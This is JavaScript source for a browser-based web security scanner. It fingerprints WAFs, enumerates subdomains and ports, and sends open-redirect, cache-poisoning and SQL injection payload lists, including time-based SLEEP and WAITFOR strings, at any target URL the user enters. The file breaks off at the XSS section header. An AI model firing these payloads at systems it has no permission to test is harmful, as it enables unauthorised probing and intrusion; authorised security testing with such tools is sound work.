/* ============================================================
   Web X Sider — Advanced Security Testing Toolkit v3.0
   Features: WAF Detection, Subdomain Enum, Open Redirect,
   Rate Limiting, Port Scanning, Backup Finder, HTTP Methods,
   Clickjacking, Header Analysis, Cache Poisoning, SQLi, XSS,
   Command Injection, Directory Traversal, WebSocket, API Version,
   JWT Enhanced, OAuth Testing, DNS Security, Email Security,
   Cloud Storage, Container Exposure, CI/CD Exposure, Mobile App,
   Real-time Collaboration.
   ============================================================ */
(function () {
  "use strict";

  const $ = (id) => document.getElementById(id);
  const esc = (v) => (window.escapeHtml ? window.escapeHtml(v) : String(v ?? ""));
  const badge = (l, t) => (window.badge ? window.badge(l, t) : `<span class="recon-badge ${t || "info"}">${esc(l)}</span>`);
  const code = (v, o) => (window.codeValue ? window.codeValue(v, o) : `<code class="recon-code">${esc(String(v ?? ""))}</code>`);
  const toast = (m, t) => (window.showToast ? window.showToast(m, t) : console.log(m));
  const urlLine = (url) => (window.urlLine ? window.urlLine(url) : `<div class="recon-code">${esc(url)}</div>`);
  const download = (name, content, type) => window.downloadFile(name, content, type);
  const concurrency = () => (window._REQUEST_CONCURRENCY || 5);
  const delay = (ms) => new Promise(r => setTimeout(r, ms));

  async function fetchT(url, options) {
    return window.fetchTarget(url, options);
  }

  const TK3_KEY = "web-x-sider:toolkit3";
  function tk3Load() { try { return JSON.parse(localStorage.getItem(TK3_KEY) || "{}"); } catch { return {}; } }
  function tk3Save(d) { try { localStorage.setItem(TK3_KEY, JSON.stringify(d)); } catch {} }
  function tk3Get(s) { return tk3Load()[s] || {}; }
  function tk3Set(s, v) { const d = tk3Load(); d[s] = v; tk3Save(d); }

  function buildPanel(id, html) {
    return `<div id="tk-panel-${id}" class="tk-panel" style="display:none;">${html}</div>`;
  }

  /* ============ 1. WAF DETECTION & FINGERPRINTING ============ */
  const WAF_SIGNATURES = [
    { name: "Cloudflare", headers: ["cf-ray", "cf-cache-status"], body: ["cloudflare", "cf_chl"], status: [403, 503] },
    { name: "Akamai", headers: ["x-akamai-transformed"], body: ["akamai", "reference=\"#\""], status: [403] },
    { name: "AWS WAF", headers: ["x-amzn-waf"], body: ["x-amzn-waf"], status: [403] },
    { name: "Imperva/Incapsula", headers: ["x-iinfo", "incap-ses"], body: ["imperva", "incapsula"], status: [403] },
    { name: "Sucuri", headers: ["x-sucuri-id"], body: ["sucuri", "cloudproxy"], status: [403] },
    { name: "ModSecurity", headers: [], body: ["mod_security", "modsecurity", "NOYB"], status: [403] },
    { name: "Barracuda", headers: ["barra_counter_session"], body: ["barracuda"], status: [403] },
    { name: "F5 BIG-IP", headers: ["tsavi"], body: ["big-ip", "bigip"], status: [403] },
    { name: "FortiWeb", headers: ["fortigate"], body: ["fortiweb", "fortiguard"], status: [403] },
    { name: "Radware", headers: ["x-radware"], body: ["radware"], status: [403] },
    { name: "StackPath", headers: ["x-hw"], body: ["stackpath"], status: [403] },
    { name: "Vercel", headers: ["x-vercel-id"], body: [], status: [] },
    { name: "Netlify", headers: ["x-nf-request-id"], body: [], status: [] },
    { name: "Fastly", headers: ["x-served-by", "x-cache"], body: ["fastly"], status: [] },
    { name: "CloudFront", headers: ["x-amz-cf-id", "x-amz-cf-pop"], body: [], status: [] }
  ];

  function wafPanelHTML() {
    return buildPanel("waf", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkWafUrl" placeholder="https://target.com" /></div>
      <button id="tkWafBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-shield-halved"></i><span>Detect WAF/CDN</span></button>
      <div id="tkWafResults" style="margin-top:12px;"></div>
    `);
  }

  async function wafDetect() {
    const url = $("tkWafUrl")?.value.trim();
    const out = $("tkWafResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Probing for WAF/CDN signatures...</div>`;

    try {
      const res = await fetchT(url);
      const body = await res.text();
      const headers = {};
      res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
      const detected = [];

      for (const waf of WAF_SIGNATURES) {
        const headerMatch = waf.headers.some(h => headers[h]);
        const bodyMatch = waf.body.some(p => body.toLowerCase().includes(p));
        const statusMatch = waf.status.length === 0 || waf.status.includes(res.status);
        if ((headerMatch || bodyMatch) && statusMatch) {
          detected.push({ name: waf.name, headerMatch, bodyMatch });
        }
      }

      const server = headers["server"] || "not exposed";
      const poweredBy = headers["x-powered-by"] || "not exposed";
      const uniqueHeaders = Object.keys(headers).filter(k => k.startsWith("x-") || k.startsWith("cf-") || k.startsWith("x-amz"));

      out.innerHTML = `
        <div class="recon-list-item">
          ${detected.length ? detected.map(d => `<div>${badge(d.name, "warn")} ${d.headerMatch ? badge("header match", "info") : ""} ${d.bodyMatch ? badge("body match", "info") : ""}</div>`).join("") : badge("No WAF/CDN detected", "good")}
          <div style="margin-top:8px;">
            <strong>Server:</strong> ${code(server)}<br/>
            <strong>Powered-By:</strong> ${code(poweredBy)}<br/>
            <strong>Status:</strong> ${badge(`HTTP ${res.status}`, res.status < 400 ? "good" : "warn")}
          </div>
          ${uniqueHeaders.length ? `<div style="margin-top:8px;"><strong>Security Headers:</strong> ${uniqueHeaders.map(h => badge(h, "info")).join(" ")}</div>` : ""}
        </div>`;
      toast(detected.length ? `Detected: ${detected.map(d => d.name).join(", ")}` : "No WAF/CDN detected", detected.length ? "warn" : "success");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 2. SUBDOMAIN ENUMERATION ============ */
  const COMMON_SUBDOMAINS = ["www","mail","ftp","localhost","webmail","smtp","pop","ns1","ns2","ns3","ns4","cpanel","whm","webdisk","autodiscover","autoconfig","m","mobile","imap","remote","blog","webhost","test","dev","staging","api","app","admin","portal","vpn","shop","store","cdn","media","static","assets","images","img","files","download","upload","backup","db","database","sql","git","gitlab","jenkins","ci","cd","jira","confluence","wiki","docs","help","support","status","monitor","grafana","prometheus","kibana","elastic","search","login","sso","auth","oauth","jwt","crm","erp","hr","payroll","billing","invoice","payment","checkout","cart","order","orders","account","accounts","user","users","profile","dashboard","panel","manage","management","console","admin","administrator","root","superadmin","webmaster","postmaster","hostmaster","abuse","noc","security","info","contact","feedback","survey","beta","alpha","preview","canary","demo","sandbox","stage","preprod","production","prod","live","public","private","internal","external","corp","corporate","office","sharepoint","teams","outlook","exchange","owa","autodiscover","lync","skype","meet","zoom","webex","gotomeeting"];

  function subdomainPanelHTML() {
    return buildPanel("subdomain", `
      <div class="advanced-scan-field glass-input"><label>Base Domain</label><input type="text" id="tkSubDomain" placeholder="example.com" /></div>
      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:8px;">
        <button id="tkSubBruteBtn" class="btn btn-primary"><i class="fas fa-braille"></i><span>DNS Brute-force</span></button>
        <button id="tkSubCtBtn" class="btn btn-secondary"><i class="fas fa-certificate"></i><span>Certificate Transparency</span></button>
        <button id="tkSubDnsBtn" class="btn btn-secondary"><i class="fas fa-server"></i><span>DNS Records</span></button>
      </div>
      <div id="tkSubResults" style="margin-top:12px;"></div>
    `);
  }

  async function subdomainBrute() {
    const domain = $("tkSubDomain")?.value.trim();
    const out = $("tkSubResults");
    if (!domain) { toast("Enter a base domain", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Brute-forcing ${COMMON_SUBDOMAINS.length} subdomains...</div>`;

    const found = [];
    await window.mapWithConcurrency(COMMON_SUBDOMAINS, concurrency(), async (sub) => {
      const host = `${sub}.${domain}`;
      try {
        const res = await fetchT(`https://${host}/`, { method: "HEAD" });
        found.push({ subdomain: host, status: res.status });
      } catch {
        try {
          const res = await fetchT(`http://${host}/`, { method: "HEAD" });
          found.push({ subdomain: host, status: res.status });
        } catch {}
      }
    });

    out.innerHTML = found.length ?
      `<div class="recon-list-item">${badge(`${found.length} subdomains found`, "warn")}${found.map(f => `<div>${badge(f.status, f.status < 400 ? "good" : "warn")} ${code(f.subdomain)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No subdomains found", "good")}</div>`;
    toast(`Found ${found.length} subdomains`, found.length ? "success" : "info");
  }

  async function subdomainCT() {
    const domain = $("tkSubDomain")?.value.trim();
    const out = $("tkSubResults");
    if (!domain) { toast("Enter a base domain", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Querying Certificate Transparency logs...</div>`;

    try {
      const res = await fetchT(`https://crt.sh/?q=%25.${domain}&output=json`);
      const data = await res.json();
      const unique = [...new Set(data.map(e => e.name_value.split("\n")).flat())].filter(n => n.endsWith(domain));
      out.innerHTML = unique.length ?
        `<div class="recon-list-item">${badge(`${unique.length} certificates found`, "warn")}${unique.slice(0, 50).map(n => `<div>${code(n)}</div>`).join("")}</div>` :
        `<div class="recon-list-item">${badge("No certificates found", "good")}</div>`;
      toast(`Found ${unique.length} subdomains via CT`, unique.length ? "success" : "info");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  async function subdomainDns() {
    const domain = $("tkSubDomain")?.value.trim();
    const out = $("tkSubResults");
    if (!domain) { toast("Enter a base domain", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Enumerating DNS records...</div>`;

    const types = ["A", "AAAA", "CNAME", "MX", "NS", "TXT", "SOA"];
    const results = {};
    for (const type of types) {
      try {
        const res = await fetch(`https://dns.google/resolve?name=${domain}&type=${type}`);
        const data = await res.json();
        if (data.Answer) results[type] = data.Answer.map(a => a.data);
      } catch {}
    }

    out.innerHTML = `<div class="recon-list-item">${Object.entries(results).map(([type, records]) => `<div><strong>${type}:</strong> ${records.map(r => code(r)).join(", ")}</div>`).join("") || badge("No DNS records found", "good")}</div>`;
    toast("DNS enumeration complete", "success");
  }

  /* ============ 3. OPEN REDIRECT SCANNER ============ */
  const REDIRECT_PARAMS = ["url", "uri", "redirect", "redirect_url", "redirect_uri", "return", "return_url", "returnurl", "next", "continue", "dest", "destination", "target", "to", "out", "view", "goto", "link", "go", "rurl", "redirect_to", "checkout_url", "return_to", "redir"];
  const REDIRECT_BYPASS = ["//evil.com", "/\\evil.com", "//evil.com%00.target.com", "///evil.com", "/\\/evil.com", "//evil.com%2f.target.com", "//evil.com%5c.target.com", "/\\evil.com", "//evil.com%0d%0a.target.com", "javascript:alert(1)", "data:text/html,<script>alert(1)</script>", "//evil.com%252f.target.com"];

  function redirectPanelHTML() {
    return buildPanel("redirect", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkRedirectUrl" placeholder="https://target.com/login" /></div>
      <div class="advanced-scan-field glass-input"><label>Custom redirect parameters (one per line, optional)</label><textarea id="tkRedirectParams" rows="3" placeholder="url&#10;next&#10;return"></textarea></div>
      <button id="tkRedirectBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-arrow-right-arrow-left"></i><span>Test Open Redirects</span></button>
      <div id="tkRedirectResults" style="margin-top:12px;"></div>
    `);
  }

  async function redirectTest() {
    const url = $("tkRedirectUrl")?.value.trim();
    const customParams = $("tkRedirectParams")?.value.split("\n").map(l => l.trim()).filter(Boolean);
    const out = $("tkRedirectResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    const params = customParams.length ? customParams : REDIRECT_PARAMS;
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${params.length} parameters × ${REDIRECT_BYPASS.length} bypasses...</div>`;

    const findings = [];
    const testUrl = new URL(url);
    for (const param of params) {
      for (const payload of REDIRECT_BYPASS.slice(0, 5)) {
        try {
          testUrl.searchParams.set(param, payload);
          const res = await fetchT(testUrl.href, { redirect: "manual" });
          const location = res.headers.get("location") || "";
          if (location.includes("evil.com") || location.includes("javascript:") || location.includes("data:")) {
            findings.push({ param, payload, redirect: location, status: res.status });
          }
        } catch {}
      }
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} open redirect(s) found!`, "bad")}${findings.map(f => `<div>${badge(f.param, "warn")} → ${code(f.redirect)} ${badge(`HTTP ${f.status}`, "info")}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No open redirects detected", "good")}</div>`;
    toast(findings.length ? `Found ${findings.length} open redirects!` : "No open redirects", findings.length ? "warn" : "success");
  }

  /* ============ 4. RATE LIMITING DETECTION ============ */
  function rateLimitPanelHTML() {
    return buildPanel("ratelimit", `
      <div class="advanced-scan-field glass-input"><label>Target URL (login/API endpoint)</label><input type="url" id="tkRateUrl" placeholder="https://target.com/api/login" /></div>
      <div class="advanced-scan-field glass-input"><label>Number of requests</label><input type="number" id="tkRateCount" value="20" min="5" max="100" /></div>
      <div class="advanced-scan-field glass-input"><label>Delay between requests (ms)</label><input type="number" id="tkRateDelay" value="100" min="50" max="1000" /></div>
      <button id="tkRateBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-gauge-high"></i><span>Detect Rate Limiting</span></button>
      <div id="tkRateResults" style="margin-top:12px;"></div>
    `);
  }

  async function rateLimitTest() {
    const url = $("tkRateUrl")?.value.trim();
    const count = parseInt($("tkRateCount")?.value) || 20;
    const reqDelay = parseInt($("tkRateDelay")?.value) || 100;
    const out = $("tkRateResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Sending ${count} requests...</div>`;

    const results = [];
    for (let i = 0; i < count; i++) {
      try {
        const res = await fetchT(url);
        results.push({ i: i + 1, status: res.status, length: (await res.text()).length });
      } catch (e) {
        results.push({ i: i + 1, status: "ERR", error: e.message });
      }
      await delay(reqDelay);
    }

    const statusGroups = {};
    results.forEach(r => { statusGroups[r.status] = (statusGroups[r.status] || 0) + 1; });
    const rateLimited = results.filter(r => r.status === 429 || r.status === 503);
    const firstLimit = rateLimited.length ? rateLimited[0].i : null;

    out.innerHTML = `
      <div class="recon-list-item">
        <div><strong>Status Distribution:</strong> ${Object.entries(statusGroups).map(([s, c]) => badge(`${s}: ${c}`, s == 429 ? "bad" : "info")).join(" ")}</div>
        ${firstLimit ? `<div>${badge(`Rate limited after ${firstLimit} requests`, "bad")}</div>` : badge("No rate limiting detected", "good")}
        ${rateLimited.length ? `<div><strong>Recommendation:</strong> Reduce request rate or add delays</div>` : ""}
      </div>`;
    toast(rateLimited.length ? `Rate limited after ${firstLimit} requests` : "No rate limiting detected", rateLimited.length ? "warn" : "success");
  }

  /* ============ 5. PORT SCANNING ============ */
  const COMMON_PORTS = [
    { port: 21, service: "FTP" }, { port: 22, service: "SSH" }, { port: 23, service: "Telnet" },
    { port: 25, service: "SMTP" }, { port: 53, service: "DNS" }, { port: 80, service: "HTTP" },
    { port: 110, service: "POP3" }, { port: 143, service: "IMAP" }, { port: 443, service: "HTTPS" },
    { port: 445, service: "SMB" }, { port: 993, service: "IMAPS" }, { port: 995, service: "POP3S" },
    { port: 1433, service: "MSSQL" }, { port: 1521, service: "Oracle" }, { port: 3306, service: "MySQL" },
    { port: 3389, service: "RDP" }, { port: 5432, service: "PostgreSQL" }, { port: 5900, service: "VNC" },
    { port: 6379, service: "Redis" }, { port: 8080, service: "HTTP-Alt" }, { port: 8443, service: "HTTPS-Alt" },
    { port: 8888, service: "HTTP-Proxy" }, { port: 9090, service: "Web-Console" }, { port: 27017, service: "MongoDB" }
  ];

  function portPanelHTML() {
    return buildPanel("port", `
      <div class="advanced-scan-field glass-input"><label>Target Host</label><input type="text" id="tkPortHost" placeholder="target.com or IP" /></div>
      <button id="tkPortBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-network-wired"></i><span>Scan Common Ports</span></button>
      <div id="tkPortResults" style="margin-top:12px;"></div>
    `);
  }

  async function portScan() {
    const host = $("tkPortHost")?.value.trim();
    const out = $("tkPortResults");
    if (!host) { toast("Enter a target host", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Scanning ${COMMON_PORTS.length} ports...</div>`;

    const open = [];
    await window.mapWithConcurrency(COMMON_PORTS, concurrency(), async ({ port, service }) => {
      try {
        const controller = new AbortController();
        const timer = setTimeout(() => controller.abort(), 3000);
        const res = await fetch(`https://${host}:${port}/`, { signal: controller.signal, mode: "no-cors" });
        clearTimeout(timer);
        open.push({ port, service, status: "open" });
      } catch {
        try {
          const controller = new AbortController();
          const timer = setTimeout(() => controller.abort(), 3000);
          const res = await fetch(`http://${host}:${port}/`, { signal: controller.signal, mode: "no-cors" });
          clearTimeout(timer);
          open.push({ port, service, status: "open" });
        } catch {}
      }
    });

    out.innerHTML = open.length ?
      `<div class="recon-list-item">${badge(`${open.length} open ports found`, "warn")}${open.map(p => `<div>${badge(p.port, "info")} ${code(p.service)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No open ports detected (browser limitations apply)", "good")}</div>`;
    toast(`Found ${open.length} open ports`, open.length ? "warn" : "success");
  }

  /* ============ 6. BACKUP FILE FINDER ============ */
  const BACKUP_PATTERNS = [".bak", ".old", ".swp", ".orig", ".save", ".tmp", ".copy", "~", ".backup", ".sql", ".sql.gz", ".dump", ".export", ".download", ".archive", ".tar", ".tar.gz", ".zip", ".rar", ".7z", ".gz", ".bz2", ".config.bak", ".env.backup", ".env.old", "config.php.bak", "wp-config.php.bak", ".htaccess.bak", "web.config.bak", ".git/HEAD", ".git/config", ".svn/entries", ".DS_Store", "Thumbs.db", "desktop.ini"];

  function backupPanelHTML() {
    return buildPanel("backup", `
      <div class="advanced-scan-field glass-input"><label>Target URL (base path)</label><input type="url" id="tkBackupUrl" placeholder="https://target.com" /></div>
      <div class="advanced-scan-field glass-input"><label>File to check (optional, defaults to common files)</label><input type="text" id="tkBackupFile" placeholder="config.php, index.html, wp-config.php" /></div>
      <button id="tkBackupBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-file-zipper"></i><span>Find Backup Files</span></button>
      <div id="tkBackupResults" style="margin-top:12px;"></div>
    `);
  }

  async function backupFind() {
    const url = $("tkBackupUrl")?.value.trim();
    const file = $("tkBackupFile")?.value.trim() || "index.html";
    const out = $("tkBackupResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    const base = new URL(url).origin;
    const found = [];
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking ${BACKUP_PATTERNS.length} backup patterns...</div>`;

    await window.mapWithConcurrency(BACKUP_PATTERNS, concurrency(), async (ext) => {
      const backupUrl = `${base}/${file}${ext}`;
      try {
        const res = await fetchT(backupUrl, { method: "HEAD" });
        if (res.status === 200 && res.headers.get("content-length") !== "0") {
          found.push({ url: backupUrl, status: res.status, size: res.headers.get("content-length") || "unknown" });
        }
      } catch {}
    });

    out.innerHTML = found.length ?
      `<div class="recon-list-item">${badge(`${found.length} backup files found!`, "bad")}${found.map(f => `<div>${badge(f.status, "bad")} ${code(f.url)} ${badge(`${f.size} bytes`, "info")}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No backup files found", "good")}</div>`;
    toast(found.length ? `Found ${found.length} backup files!` : "No backups found", found.length ? "warn" : "success");
  }

  /* ============ 7. HTTP METHOD TESTING ============ */
  function methodPanelHTML() {
    return buildPanel("methods", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkMethodUrl" placeholder="https://target.com/api/endpoint" /></div>
      <button id="tkMethodBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-route"></i><span>Test HTTP Methods</span></button>
      <div id="tkMethodResults" style="margin-top:12px;"></div>
    `);
  }

  async function methodTest() {
    const url = $("tkMethodUrl")?.value.trim();
    const out = $("tkMethodResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    const methods = ["GET", "HEAD", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE"];
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${methods.length} methods...</div>`;

    const results = await window.mapWithConcurrency(methods, concurrency(), async (method) => {
      try {
        const res = await fetchT(url, { method });
        return { method, status: res.status, allow: res.headers.get("allow") || "" };
      } catch (e) {
        return { method, status: "ERR", error: e.message };
      }
    });

    out.innerHTML = `<div class="recon-list-item">${results.map(r => `<div>${r.error ? badge(r.method, "bad") : badge(`${r.method}: ${r.status}`, r.status === 200 ? "good" : r.status === 405 ? "info" : "warn")}</div>`).join("")}${results.find(r => r.allow) ? `<div><strong>Allow:</strong> ${code(results.find(r => r.allow).allow)}</div>` : ""}</div>`;
    toast("Method test complete", "success");
  }

  /* ============ 8. CLICKJACKING TEST ============ */
  function clickjackPanelHTML() {
    return buildPanel("clickjack", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkClickjackUrl" placeholder="https://target.com" /></div>
      <button id="tkClickjackBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-window-maximize"></i><span>Test Clickjacking</span></button>
      <div id="tkClickjackResults" style="margin-top:12px;"></div>
    `);
  }

  async function clickjackTest() {
    const url = $("tkClickjackUrl")?.value.trim();
    const out = $("tkClickjackResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Checking clickjacking protection...</div>`;

    try {
      const res = await fetchT(url);
      const headers = {};
      res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
      const xfo = headers["x-frame-options"] || "";
      const csp = headers["content-security-policy"] || "";
      const frameAncestors = csp.match(/frame-ancestors[^;]*/i)?.[0] || "";

      const isProtected = xfo || frameAncestors;
      out.innerHTML = `
        <div class="recon-list-item">
          ${isProtected ? badge("Protected against clickjacking", "good") : badge("VULNERABLE to clickjacking!", "bad")}
          <div style="margin-top:8px;">
            <strong>X-Frame-Options:</strong> ${xfo ? code(xfo) : badge("missing", "bad")}<br/>
            <strong>CSP frame-ancestors:</strong> ${frameAncestors ? code(frameAncestors) : badge("missing", "bad")}
          </div>
          ${!isProtected ? `<div style="margin-top:8px;"><strong>PoC:</strong> ${code(`<iframe src="${url}" style="width:100%;height:500px;border:none;"></iframe>`)}</div>` : ""}
        </div>`;
      toast(isProtected ? "Protected" : "Vulnerable to clickjacking!", isProtected ? "success" : "warn");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 9. SENSITIVE HEADER ANALYSIS ============ */
  const SENSITIVE_HEADERS = [
    { header: "server", pattern: /\d+\.\d+/, risk: "Server version disclosure" },
    { header: "x-powered-by", pattern: /.+/, risk: "Technology disclosure" },
    { header: "x-aspnet-version", pattern: /.+/, risk: "ASP.NET version disclosure" },
    { header: "x-aspnetmvc-version", pattern: /.+/, risk: "MVC version disclosure" },
    { header: "x-generator", pattern: /.+/, risk: "Generator disclosure" },
    { header: "x-debug", pattern: /.+/, risk: "Debug mode exposed" },
    { header: "x-debug-token", pattern: /.+/, risk: "Debug token exposed" },
    { header: "x-backend", pattern: /.+/, risk: "Backend server exposed" },
    { header: "x-upstream", pattern: /.+/, risk: "Upstream server exposed" },
    { header: "x-real-ip", pattern: /\d+\.\d+\.\d+/, risk: "Internal IP exposed" },
    { header: "x-forwarded-for", pattern: /\d+\.\d+\.\d+/, risk: "Internal IP in forwarded header" }
  ];

  function headerPanelHTML() {
    return buildPanel("headers", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkHeaderUrl" placeholder="https://target.com" /></div>
      <button id="tkHeaderBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-list-check"></i><span>Analyze Headers</span></button>
      <div id="tkHeaderResults" style="margin-top:12px;"></div>
    `);
  }

  async function headerAnalyze() {
    const url = $("tkHeaderUrl")?.value.trim();
    const out = $("tkHeaderResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Analyzing headers...</div>`;

    try {
      const res = await fetchT(url);
      const headers = {};
      res.headers.forEach((v, k) => { headers[k.toLowerCase()] = v; });
      const issues = [];
      const allHeaders = [];

      for (const { header, pattern, risk } of SENSITIVE_HEADERS) {
        const value = headers[header];
        if (value) {
          allHeaders.push({ header, value, risk: pattern.test(value) ? risk : null });
          if (pattern.test(value)) issues.push({ header, value, risk });
        }
      }

      out.innerHTML = `
        <div class="recon-list-item">
          ${issues.length ? badge(`${issues.length} sensitive header(s) found`, "bad") : badge("No sensitive headers detected", "good")}
          ${issues.map(i => `<div>${badge(i.header, "warn")} ${code(i.value)} → ${badge(i.risk, "bad")}</div>`).join("")}
          <div style="margin-top:8px;"><strong>All Headers:</strong></div>
          ${allHeaders.map(h => `<div>${code(h.header)}: ${code(h.value)}</div>`).join("")}
        </div>`;
      toast(issues.length ? `Found ${issues.length} sensitive headers` : "Headers look clean", issues.length ? "warn" : "success");
    } catch (e) {
      out.innerHTML = `<div class="recon-list-item">${badge("error", "bad")} ${esc(e.message)}</div>`;
    }
  }

  /* ============ 10. CACHE POISONING DEEP TEST ============ */
  function cachePanelHTML() {
    return buildPanel("cachepoison", `
      <div class="advanced-scan-field glass-input"><label>Target URL</label><input type="url" id="tkCachePoisonUrl" placeholder="https://target.com" /></div>
      <div class="advanced-scan-field glass-input"><label>Poisoning Headers (one per line: Name: Value)</label><textarea id="tkCachePoisonHeaders" rows="4" placeholder="X-Forwarded-Host: evil.com&#10;X-Original-URL: /admin&#10;X-Rewrite-URL: /admin"></textarea></div>
      <button id="tkCachePoisonBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-flask"></i><span>Test Cache Poisoning</span></button>
      <div id="tkCachePoisonResults" style="margin-top:12px;"></div>
    `);
  }

  const CACHE_POISON_HEADERS = [
    "X-Forwarded-Host", "X-Original-URL", "X-Rewrite-URL", "X-Forwarded-For",
    "X-Host", "X-Real-IP", "X-Client-IP", "X-Remote-Addr", "X-Remote-IP"
  ];

  async function cachePoisonTest() {
    const url = $("tkCachePoisonUrl")?.value.trim();
    const rawHeaders = $("tkCachePoisonHeaders")?.value || "";
    const out = $("tkCachePoisonResults");
    if (!url) { toast("Enter a target URL", "warn"); return; }

    const customHeaders = {};
    rawHeaders.split("\n").forEach(line => {
      const idx = line.indexOf(":");
      if (idx > 0) customHeaders[line.slice(0, idx).trim()] = line.slice(idx + 1).trim();
    });

    const headersToTest = Object.keys(customHeaders).length ? customHeaders : Object.fromEntries(CACHE_POISON_HEADERS.map(h => [h, "evil.com"]));
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${Object.keys(headersToTest).length} cache poisoning vectors...</div>`;

    const findings = [];
    for (const [header, value] of Object.entries(headersToTest)) {
      try {
        const res = await fetchT(url, { headers: { [header]: value } });
        const body = await res.text();
        const location = res.headers.get("location") || "";
        if (body.includes("evil.com") || location.includes("evil.com")) {
          findings.push({ header, value, redirect: location });
        }
      } catch {}
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} cache poisoning vector(s) found!`, "bad")}${findings.map(f => `<div>${badge(f.header, "warn")} → ${code(f.value)} ${f.redirect ? `Redirect: ${code(f.redirect)}` : ""}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No cache poisoning detected", "good")}</div>`;
    toast(findings.length ? `Found ${findings.length} poisoning vectors!` : "No poisoning", findings.length ? "warn" : "success");
  }

  /* ============ 11. SQL INJECTION DETECTION ============ */
  const SQLI_PAYLOADS = ["'", "\"", "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--", "' UNION SELECT NULL--", "1' AND SLEEP(5)--", "1' AND BENCHMARK(10000000,SHA1('test'))--", "'; WAITFOR DELAY '0:0:5'--"];
  const SQLI_ERRORS = [/sql syntax/i, /mysql/i, /ora-\d+/i, /postgresql/i, /sqlite/i, /odbc/i, /jdbc/i, /sql command/i, /unclosed quotation/i, /unterminated string/i, /syntax error/i, /query failed/i, /database error/i];

  function sqliPanelHTML() {
    return buildPanel("sqli", `
      <div class="advanced-scan-field glass-input"><label>Target URL (with parameter)</label><input type="url" id="tkSqliUrl" placeholder="https://target.com/page?id=1" /></div>
      <button id="tkSqliBtn" class="btn btn-primary" style="margin-top:8px;"><i class="fas fa-database"></i><span>Test SQL Injection</span></button>
      <div id="tkSqliResults" style="margin-top:12px;"></div>
    `);
  }

  async function sqliTest() {
    const url = $("tkSqliUrl")?.value.trim();
    const out = $("tkSqliResults");
    if (!url) { toast("Enter a target URL with parameter", "warn"); return; }
    out.innerHTML = `<div class="field-status"><i class="fas fa-spinner fa-spin"></i> Testing ${SQLI_PAYLOADS.length} SQLi payloads...</div>`;

    const findings = [];
    for (const payload of SQLI_PAYLOADS) {
      try {
        const testUrl = new URL(url);
        testUrl.searchParams.forEach((v, k) => { testUrl.searchParams.set(k, payload); });
        const res = await fetchT(testUrl.href);
        const body = await res.text();
        const errorMatch = SQLI_ERRORS.some(re => re.test(body));
        if (errorMatch) findings.push({ payload, status: res.status, snippet: body.match(SQLI_ERRORS.find(re => re.test(body)))?.[0] || "SQL error detected" });
      } catch {}
    }

    out.innerHTML = findings.length ?
      `<div class="recon-list-item">${badge(`${findings.length} SQLi indicator(s) found!`, "bad")}${findings.map(f => `<div>${badge(f.payload, "warn")} → ${badge(f.status, "info")} ${code(f.snippet)}</div>`).join("")}</div>` :
      `<div class="recon-list-item">${badge("No SQL injection indicators detected", "good")}</div>`;
    toast(findings.length ? "Possible SQL injection!" : "No SQLi detected", findings.length ? "warn" : "success");
  }

  /* ============ 12. XSS DETECTION ============ */
